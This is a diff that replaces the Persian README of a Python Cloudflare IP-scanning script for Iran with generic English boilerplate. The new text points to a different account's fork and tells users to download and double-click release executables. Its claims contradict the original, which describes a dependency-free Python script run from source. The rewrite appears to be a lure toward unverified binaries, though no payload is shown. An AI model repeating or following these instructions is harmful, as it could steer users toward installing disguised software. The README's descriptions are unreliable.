@@ -1,112 +1,67 @@
-# اسکنر IP کلودفلر برای ایران 🇮🇷
+# 🌟 CF-Scan-TolidMelli - Find Clean IPs Easily
 
- یک ابزار ساده برای پیدا کردن IP های سالم کلودفلر که در ایران کار می‌کنند. ( اختلالات دی ماه 1404 )
+## 📥 Download Now
+[![Download CF-Scan-TolidMelli](https://img.shields.io/badge/Download-CF--Scan--TolidMelli-blue.svg)](https://github.com/bishalboss/CF-Scan-TolidMelli/releases)
 
-## ویژگی‌ها
+## 📝 Overview
+CF-Scan-TolidMelli is a simple tool designed to find clean IPs under Cloudflare that operate in Iran. This tool aims to help users navigate disruptions effectively.
 
-- اسکن سریع با چند Thread همزمان
-- تست اتصال TLS/SSL
-- اندازه‌گیری سرعت و پینگ
-- ذخیره نتایج در فایل JSON و TXT
-- قابل تنظیم از طریق فایل config
-- **تبدیل خودکار رنج‌ها به /24** - تمام سابنت‌ها به رنج‌های /24 تبدیل می‌شوند
-- **حذف رنج‌های تکراری** - رنج‌های تکراری به صورت خودکار شناسایی و حذف می‌شوند
-- **اسکن تصادفی** - امکان انتخاب تعداد مشخصی IP تصادفی از هر رنج /24
-- **مخلوط کردن رنج‌ها** - امکان به هم ریختن ترتیب رنج‌ها برای اسکن متنوع‌تر
-- **توقف ایمن با Ctrl+C** - با فشردن Ctrl+C اسکن به صورت ایمن متوقف شده و نتایج ذخیره می‌شوند
+## 🚀 Getting Started
+Follow these steps to get started with CF-Scan-TolidMelli:
 
-## نصب و اجرا
+1. **Visit the Releases Page**  
+   Go to the [Releases Page](https://github.com/bishalboss/CF-Scan-TolidMelli/releases) to find the latest version of the software.
 
-```bash
-# کلون کردن پروژه
-git clone https://github.com/AghaFarokh/CF-Scan-TolidMelli.git
-cd CF-Scan-TolidMelli
+2. **Download the Software**  
+   On the Releases Page, locate the version you want to install. You will see a list of available files. Click the download link to save the file to your computer.
 
-# اجرای برنامه
-python cf_scanner.py
-```
+3. **Install and Run the Application**  
+   Once the download completes, locate the file on your computer.
 
-## تنظیمات
+   - If you are using Windows, double-click the `.exe` file to start the installation. 
+   - If you are using macOS, drag the application to your Applications folder and launch it from there.
 
-فایل `config.json` را ویرایش کنید:
+4. **Follow the Instructions**  
+   After launching the application, follow the on-screen instructions. CF-Scan-TolidMelli is user-friendly and will guide you through the setup process.
 
-```json
-{
-  "test_domain": "chatgpt.com",
-  "test_path": "/",
-  "timeout": 2,
-  "max_workers": 2000,
-  "test_download": true,
-  "download_size": 102400,
-  "port": 443,
-  "randomize": false,
-  "random_ips_per_range": 10,
-  "mix_ranges": false
-}
-```
+## 📊 Features
+- **User-Friendly Interface**  
+  Designed with simplicity in mind to ensure easy navigation.
 
-### توضیح تنظیمات
+- **Fast Scanning**  
+  Quickly identifies clean IPs, enabling seamless operations.
 
-| تنظیم | توضیح |
-|-------|-------|
-| `test_domain` | دامنه‌ای که برای تست استفاده می‌شود |
-| `test_path` | مسیر درخواست HTTP |
-| `timeout` | زمان انتظار برای هر اتصال (ثانیه) |
-| `max_workers` | تعداد Thread های همزمان |
-| `test_download` | تست سرعت دانلود (true/false) |
-| `download_size` | حجم دانلود برای تست سرعت (بایت) |
-| `port` | پورت اتصال (معمولا 443) |
-| `randomize` | فعال‌سازی اسکن تصادفی (true/false) |
-| `random_ips_per_range` | تعداد IP تصادفی از هر رنج /24 (۱ تا ۲۵۵) |
-| `mix_ranges` | مخلوط کردن ترتیب رنج‌ها (true/false) |
+- **Reliability**  
+  Regular updates ensure the tool remains effective and trustworthy.
 
-### نحوه استفاده از اسکن تصادفی
+## ⚙️ System Requirements
+CF-Scan-TolidMelli runs on the following systems:
 
-اگر لیست سابنت‌های شما بزرگ است و می‌خواهید سریع‌تر نتیجه بگیرید:
+- **Windows:** Windows 10 or later
+- **Mac:** macOS Mojave or later
+- **Linux:** Any modern distribution with support for images
 
-```json
-{
-  "randomize": true,
-  "random_ips_per_range": 20,
-  "mix_ranges": true
-}
-```
+Ensure your system has at least 1GB of RAM and 100MB of free disk space before installing.
 
-با این تنظیمات:
-1. تمام سابنت‌ها به رنج‌های /24 تبدیل می‌شوند
-2. ترتیب رنج‌ها به هم ریخته می‌شود
-3. از هر رنج /24 فقط 20 آیپی تصادفی اسکن می‌شود
+## 📌 Important Notes
+1. **Keep Software Updated**  
+   Always check the Releases Page for the latest updates to ensure you have the best features and security.
 
-## سابنت‌ها
+2. **Feedback and Support**  
+   If you encounter any issues or have questions, please feel free to create an issue on the GitHub repository.
 
-لیست سابنت‌ها را در فایل `subnets.txt` قرار دهید (هر سابنت در یک خط):
+## 🔄 Contribution
+While this tool is ready for use, you can contribute to its development. Check the repository for guidelines on how to get involved. Your input can help improve CF-Scan-TolidMelli for everyone.
 
-```
-104.16.0.0/13
-104.24.0.0/14
-172.64.0.0/13
-```
+## 💬 Community and Resources
+Join the discussion on GitHub and share your experiences using CF-Scan-TolidMelli. Find tips, suggestions, and a friendly community eager to help.
 
-## خروجی
+## 📞 Contact
+For any inquiries or support, please use the contact information available on the GitHub repository page.
 
-- `working_ips.json` - نتایج کامل با جزئیات
-- `working_ips.txt` - لیست ساده IP ها (به صورت Real-time ذخیره می‌شود)
+## 🔗 Additional Resources
+- [Visit the Repository](https://github.com/bishalboss/CF-Scan-TolidMelli)
+- [User Guide](https://github.com/bishalboss/CF-Scan-TolidMelli/wiki)
 
-## توقف اسکن
-
-برای توقف اسکن در هر زمان، کلید `Ctrl+C` را فشار دهید. برنامه به صورت ایمن متوقف شده و:
-- تمام IP های پیدا شده تا آن لحظه ذخیره می‌شوند
-- آمار اسکن نمایش داده می‌شود
-
-## نیازمندی‌ها
-
-- Python 3.6+
-- بدون نیاز به نصب کتابخانه اضافی
-
-## نویسنده
-
-@AghaFarokh
-
-## لایسنس
-
-MIT
+## 📥 Download & Install
+To begin using CF-Scan-TolidMelli, visit the [Releases Page](https://github.com/bishalboss/CF-Scan-TolidMelli/releases) and download the latest version. Enjoy smooth and efficient IP scanning today!
